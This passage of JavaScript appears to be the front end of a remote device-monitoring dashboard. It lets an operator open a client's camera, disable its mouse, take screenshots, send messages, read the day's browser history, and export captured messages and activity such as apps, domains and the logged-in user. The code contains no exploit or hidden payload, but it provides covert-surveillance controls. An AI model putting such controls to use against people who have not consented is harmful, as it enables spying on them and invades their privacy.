    disableCameraButtonEl.addEventListener('click', openCameraDialog);
    closeCameraButtonEl.addEventListener('click', closeCameraDialog);
    cancelCameraButtonEl.addEventListener('click', closeCameraDialog);

    cameraFormEl.addEventListener('submit', async (event) => {
      event.preventDefault();
      const seconds = Number.parseInt(cameraDurationEl.value, 10);
      if (!selectedDeviceId) {
        closeCameraDialog();
        controlsStatusEl.textContent = 'Select a device first.';
        return;
      }
      if (!Number.isInteger(seconds) || seconds < 1 || seconds > 3600) {
        controlsStatusEl.textContent = 'Enter a duration from 1 to 3600 seconds.';
        cameraDurationEl.focus();
        return;
      }
      confirmCameraButtonEl.disabled = true;
      controlsStatusEl.textContent = `Opening camera for ${seconds} seconds...`;
      try {
        await postJson(`/api/devices/${encodeURIComponent(selectedDeviceId)}/command`, {
          command: 'open_camera',
          message: String(seconds),
        });
        closeCameraDialog();
        controlsStatusEl.textContent = `Camera opened for ${seconds} seconds.`;
      } catch (err) {
        controlsStatusEl.textContent = 'Camera could not be opened.';
      } finally {
        confirmCameraButtonEl.disabled = false;
      }
    });

    mouseFormEl.addEventListener('submit', async (event) => {
      event.preventDefault();
      const seconds = Number.parseInt(mouseDurationEl.value, 10);
      if (!selectedDeviceId) {
        closeMouseDialog();
        controlsStatusEl.textContent = 'Select a device first.';
        return;
      }
      if (!Number.isInteger(seconds) || seconds < 1 || seconds > 3600) {
        controlsStatusEl.textContent = 'Enter a duration from 1 to 3600 seconds.';
        mouseDurationEl.focus();
        return;
      }
      confirmMouseButtonEl.disabled = true;
      controlsStatusEl.textContent = `Disabling mouse for ${seconds} seconds...`;
      try {
        await postJson(`/api/devices/${encodeURIComponent(selectedDeviceId)}/command`, {
          command: 'disable_mouse',
          message: String(seconds),
        });
        closeMouseDialog();
        controlsStatusEl.textContent = `Mouse disabled for ${seconds} seconds.`;
      } catch (err) {
        controlsStatusEl.textContent = 'Mouse could not be disabled.';
      } finally {
        confirmMouseButtonEl.disabled = false;
      }
    });

    captureScreenshotButtonEl.addEventListener('click', async () => {
      if (!selectedDeviceId) {
        controlsStatusEl.textContent = 'Select a device first.';
        return;
      }
      captureScreenshotButtonEl.disabled = true;
      controlsScreenshotStatusEl.textContent = 'Requesting screenshot...';
      controlsScreenshotStatusEl.className = 'controls-screenshot-status requested';
      try {
        const response = await fetch(`/api/devices/${encodeURIComponent(selectedDeviceId)}/screenshot`, { method: 'POST' });
        if (!response.ok) throw new Error('request failed');
        controlsStatusEl.textContent = 'Screenshot queued for the selected client.';
        controlsScreenshotStatusEl.textContent = 'Screenshot requested';
        controlsScreenshotStatusEl.className = 'controls-screenshot-status requested';
      } catch (err) {
        controlsStatusEl.textContent = 'Screenshot request failed.';
        controlsScreenshotStatusEl.textContent = 'Screenshot request failed';
        controlsScreenshotStatusEl.className = 'controls-screenshot-status failed';
        updateSelectedDeviceScreenshot();
      }
    });

    function openMessageDialog() {
      if (!selectedDeviceId) {
        controlsStatusEl.textContent = 'Select a device first.';
        return;
      }
      messageDialogTargetEl.textContent = `Sending to ${controlsDeviceEl.textContent}`;
      messageDialogEl.showModal();
      clientMessageEl.focus();
    }

    function closeMessageDialog() {
      if (messageDialogEl.open) messageDialogEl.close();
    }

    async function openTodayHistoryDialog() {
      if (!selectedDeviceId) {
        controlsStatusEl.textContent = 'Select a device first.';
        return;
      }
      if (!historyDialogEl.open) historyDialogEl.showModal();
      todayHistoryTargetEl.textContent = `Viewing ${controlsDeviceEl.textContent}`;
      todayHistoryListEl.innerHTML = '<div class="history-empty">Loading today’s browser history...</div>';
      try {
        const items = await fetchJson(`/api/website-history?device_id=${encodeURIComponent(selectedDeviceId)}`);
        const startOfToday = new Date();
        startOfToday.setHours(0, 0, 0, 0);
        const todaysEntries = (items || [])
          .filter((entry) => Number(entry.visited_at) >= startOfToday.getTime())
          .sort((a, b) => Number(b.visited_at) - Number(a.visited_at));

        todayHistoryListEl.innerHTML = '';
        if (!todaysEntries.length) {
          todayHistoryListEl.innerHTML = '<div class="history-empty">No browser history recorded for today.</div>';
          return;
        }

        const list = document.createElement('ul');
        list.className = 'history-items';
        todaysEntries.forEach((entry) => {
          const item = document.createElement('li');
          item.className = 'history-item';
          const time = document.createElement('span');
          time.className = 'history-time';
          time.textContent = formatTime(Number(entry.visited_at));
          const browser = document.createElement('span');
          browser.className = 'history-browser';
          browser.textContent = `${entry.browser || 'Unknown browser'}`;
          const link = document.createElement('a');
          link.className = 'history-link';
          link.href = entry.url;
          link.target = '_blank';
          link.rel = 'noopener noreferrer';
          link.textContent = entry.url;
          item.append(time, browser, link);
          list.appendChild(item);
        });
        todayHistoryListEl.appendChild(list);
      } catch (err) {
        todayHistoryListEl.innerHTML = '<div class="history-empty">Today’s browser history is unavailable.</div>';
      }
    }

    function closeHistoryDialog() {
      if (historyDialogEl.open) historyDialogEl.close();
    }

    openMessageButtonEl.addEventListener('click', openMessageDialog);
    closeMessageButtonEl.addEventListener('click', closeMessageDialog);
    cancelMessageButtonEl.addEventListener('click', closeMessageDialog);
    todayHistoryButtonEl.addEventListener('click', openTodayHistoryDialog);
    closeHistoryButtonEl.addEventListener('click', closeHistoryDialog);
    closeHistoryDialogButtonEl.addEventListener('click', closeHistoryDialog);
    clientMessageEl.addEventListener('input', () => {
      messageLengthEl.textContent = `${clientMessageEl.value.length} / 2000`;
    });

    messageComposeEl.addEventListener('submit', async (event) => {
      event.preventDefault();
      const message = clientMessageEl.value.trim();
      if (!selectedDeviceId) {
        controlsStatusEl.textContent = 'Select a device first.';
        return;
      }
      if (!message) {
        controlsStatusEl.textContent = 'Type a message first.';
        clientMessageEl.focus();
        return;
      }
      sendMessageButtonEl.disabled = true;
      controlsStatusEl.textContent = 'Sending message...';
      try {
        await postJson(`/api/devices/${encodeURIComponent(selectedDeviceId)}/command`, { command: 'message', message });
        clientMessageEl.value = '';
        messageLengthEl.textContent = '0 / 2000';
        closeMessageDialog();
        controlsStatusEl.textContent = 'Message queued for the selected client.';
      } catch (err) {
        controlsStatusEl.textContent = 'Message could not be sent.';
      } finally {
        sendMessageButtonEl.disabled = false;
      }
    });

    refreshButtonEl.addEventListener('click', () => window.location.reload());

    async function loadCommandHistory() {
      commandHistoryEl.innerHTML = '';
      if (!selectedDeviceId) {
        commandHistoryEl.textContent = 'Select a device to view command history.';
        return;
      }
      try {
        const commands = await fetchJson(`/api/devices/${encodeURIComponent(selectedDeviceId)}/commands`);
        if (!commands.length) {
          commandHistoryEl.textContent = 'No commands recorded yet.';
          return;
        }
        commands.forEach((command) => {
          const item = document.createElement('div');
          item.className = 'command-history-item';
          item.textContent = `${command.command} | ${command.status} | ${formatTime(command.created_at)}`;
          commandHistoryEl.appendChild(item);
        });
      } catch (err) {
        commandHistoryEl.textContent = 'Command history unavailable.';
      }
    }

    async function loadActivity() {
      const query = selectedDeviceId ? `?device_id=${encodeURIComponent(selectedDeviceId)}` : '';
      try {
        const activity = await fetchJson(`/api/activity${query}`);
        activityStatsEl.innerHTML = '';
        [[activity.messages, 'Messages'], [activity.website_visits, 'Website visits'], [activity.raw_events, 'Raw events']].forEach(([value, label]) => {
          const stat = document.createElement('div');
          stat.className = 'activity-stat';
          stat.textContent = `${value} ${label}`;
          activityStatsEl.appendChild(stat);
        });
        topAppsEl.innerHTML = '';
        topDomainsEl.innerHTML = '';
        [[topAppsEl, activity.top_apps], [topDomainsEl, activity.top_domains]].forEach(([list, values]) => {
          values.forEach(([name, count]) => {
            const item = document.createElement('li');
            item.textContent = `${name}: ${count}`;
            list.appendChild(item);
          });
          if (!values.length) list.innerHTML = '<li>No data yet</li>';
        });
        const suffix = selectedDeviceId ? `?device_id=${encodeURIComponent(selectedDeviceId)}` : '';
        exportCsvLinkEl.href = `/api/export/messages${suffix}`;
        exportJsonLinkEl.href = `/api/export/messages?format=json${selectedDeviceId ? `&device_id=${encodeURIComponent(selectedDeviceId)}` : ''}`;
        await loadDeviceDetail();
        statusEl.textContent = 'Activity summary loaded';
      } catch (err) {
        statusEl.textContent = 'Activity unavailable';
      }
    }

    async function loadDeviceDetail() {
      deviceDetailEl.innerHTML = '';
      if (!selectedDeviceId) {
        deviceDetailEl.textContent = 'Select a device to view detailed telemetry.';
        return;
      }
      try {
        const detail = await fetchJson(`/api/devices/${encodeURIComponent(selectedDeviceId)}/detail`);
        const device = detail.device;
        const heading = document.createElement('h3');
        heading.textContent = `${device.name || 'Unknown device'} (${device.id})`;
        const summary = document.createElement('p');
        summary.textContent = `${device.online ? 'Online' : 'Offline'} | Client v${device.client_version || 'unknown'} | ${device.logged_in_user || 'Unknown user'} | ${device.battery_status || 'Battery unknown'}${device.battery_percent == null ? '' : ` ${device.battery_percent}%`}`;
        const apps = document.createElement('p');
        apps.textContent = `Open applications: ${(device.open_apps || []).join(', ') || 'None reported'}`;
        const commands = document.createElement('p');
        commands.textContent = `Recent commands: ${detail.commands.map((item) => `${item.command} (${item.status})`).join(', ') || 'None'}`;
        deviceDetailEl.append(heading, summary, apps, commands);
      } catch (err) {
        deviceDetailEl.textContent = 'Device detail unavailable.';
      }
    }

    messageSearchEl.addEventListener('input', queueFeedRender);
    window.addEventListener('keydown', (event) => {
      if (event.key === '/' && document.activeElement !== messageSearchEl) {
        event.preventDefault();
        messageSearchEl.focus();
      }
    });

    scopeLabelEl.textContent = selectedDeviceId ? `Device ${selectedDeviceId}` : 'All devices';
    controlsDeviceEl.textContent = selectedDeviceId
      ? `Selected device: ${selectedDeviceId}`
      : 'Select a device from the device list to enable client actions.';
    updateSelectedDeviceScreenshot();
    async function startApp() {
      await loadInitialMessages();
      connectEvents();
      loadConfig();
      loadHealth();
      loadDevices();
    }

    startApp();
    setInterval(updateUptime, 1000);
    setInterval(updateDeviceUptimes, 1000);
    setInterval(loadHealth, 30000);
    setInterval(loadDevices, 3000);
    setInterval(() => {
      if (displayMode === 'screenshots') loadScreenshots();
    }, 15000);

